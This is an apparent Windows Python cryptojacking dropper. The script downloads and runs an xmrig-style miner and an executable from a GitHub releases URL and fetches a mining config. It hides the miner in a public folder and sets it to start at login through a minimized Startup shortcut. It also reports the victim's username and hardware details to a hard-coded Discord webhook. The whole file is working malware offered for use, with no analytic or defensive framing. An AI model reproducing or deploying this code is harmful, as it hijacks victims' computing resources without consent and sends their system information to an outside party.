try:
    import os, win32com.client, wmi, urllib.request, subprocess, sys, zipfile, time, requests
except ImportError:
    pyd = str(sys.executable)
    os.system(pyd + " -m pip install -r C:/Users/Public/Documents/Benjamin/requirements.txt")
    
if(os.name != "nt"):
	os._exit(1)

computer = wmi.WMI()

rawrepo = "https://raw.githubusercontent.com/benjaminloir/super-duper-broccoli"
startupath = os.path.expanduser('~') + '/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
xmpath = "C:/Users/Public/Documents/spx"

def programcheck(process_name):
   call = 'TASKLIST', '/FI', 'imagename eq %s' % process_name
   output = subprocess.check_output(call).decode()
   last_line = output.strip().split('\r\n')[-1]
   return last_line.lower().startswith(process_name.lower())
   
def simplog():
   computer_info = computer.Win32_ComputerSystem()[0]
   os_info = computer.Win32_OperatingSystem()[0]
   proc_info = computer.Win32_Processor()[0]

   os_name = os_info.Name.encode('utf-8').split(b'|')[0]
   os_version = ' '.join([os_info.Version, os_info.BuildNumber])
   system_ram = float(os_info.TotalVisibleMemorySize) / 1048576  # KB to GB
   
   try:
      gpu = computer.Win32_VideoController()[1]
      gpu0 = computer.Win32_VideoController()[0]
      data = {
      "content" : "**New miner added or restarted.**\n```> OS Name: {}\n> OS Version: {}\n> CPU: {}\n> RAM: {} GB\n> Graphics Card-1: {}\n> Graphics Card-2: {}```".format(os_name, os_version, proc_info.Name, system_ram, gpu.Name, gpu0.Name),
      "username" : "{}".format(computer_info.Username)
      }         
   except:
      gpu = computer.Win32_VideoController()[0]      
      data = {
      "content" : "**New miner added or restarted.**\n```> OS Name: {}\n> OS Version: {}\n> CPU: {}\n> RAM: {} GB\n> Graphics Card-1: {}```".format(os_name, os_version, proc_info.Name, system_ram, gpu.Name),
      "username" : "{}".format(computer_info.Username)
      }            
   requests.post("https://discord.com/api/webhooks/1032678220287442975/fzP0Nc3F2QrPqNcA-Jb-whD1fGJFNZdd4aL70lyg3DOhqJJ3Mp3McH1q3vly4GAQqqTu", json = data)
   time.sleep(3)
 
def xm():
   try:
      gpu = computer.Win32_VideoController()[1]
   except:
      gpu = computer.Win32_VideoController()[0]
      
   if not os.path.exists(xmpath):
      os.makedirs(xmpath)
      
   if not os.path.exists(xmpath + 'doyouloveme.exe'):
      urllib.request.urlretrieve("https://github.com/benjaminloir/super-duper-broccoli/releases/download/doyouloveme/doyouloveme.zip", "{}/doyouloveme.zip".format(xmpath))
      with zipfile.ZipFile("{}/doyouloveme.zip".format(xmpath), 'r') as zip_ref:
         zip_ref.extractall(xmpath)
      time.sleep(3)
      os.remove("{}/doyouloveme.zip".format(xmpath))
      
   if not os.path.exists(xmpath + '/config.json'):
      if (gpu.AdapterCompatibility == "NVIDIA"):
         urllib.request.urlretrieve(rawrepo + '/main/cuda/config.json', '{}/config.json'.format(xmpath))
      else:
         urllib.request.urlretrieve(rawrepo + '/main/config.json', '{}/config.json'.format(xmpath))

   if(gpu.AdapterCompatibility == "NVIDIA"):
      if not os.path.exists(xmpath + 'xmrig-cuda.dll'):
         urllib.request.urlretrieve("https://github.com/benjaminloir/super-duper-broccoli/releases/download/doyouloveme/cuda.zip", "{}/cuda.zip".format(xmpath))
         with zipfile.ZipFile("{}/cuda.zip".format(xmpath), 'r') as zip_ref:
            zip_ref.extractall(xmpath)
         time.sleep(3)
         os.remove("{}/cuda.zip".format(xmpath))

   if not os.path.exists(xmpath + 'main.exe'):
      urllib.request.urlretrieve("https://github.com/benjaminloir/super-duper-broccoli/releases/download/doyouloveme/main.exe", "{}/main.exe".format(xmpath))
      os.system('{}/main.exe'.format(xmpath))
      time.sleep(5)
      
   if not os.path.exists(startupath + 'doyouloveme.lnk'):
      path = os.path.join(startupath, 'doyouloveme.lnk')
      target = '{}/doyouloveme.exe'.format(xmpath)
      icon = '{}/ico.ico'.format(xmpath)
      shell = win32com.client.Dispatch("WScript.Shell")
      shortcut = shell.CreateShortCut(path)
      shortcut.Targetpath = target
      shortcut.IconLocation = icon
      shortcut.WindowStyle = 7
      shortcut.save()         
      
   if(programcheck("doyouloveme.exe") == False):
      os.system('{}/doyouloveme.exe'.format(xmpath))
      simplog()
      os._exit(1)

xm()
#:) yeah i love you but you love me ?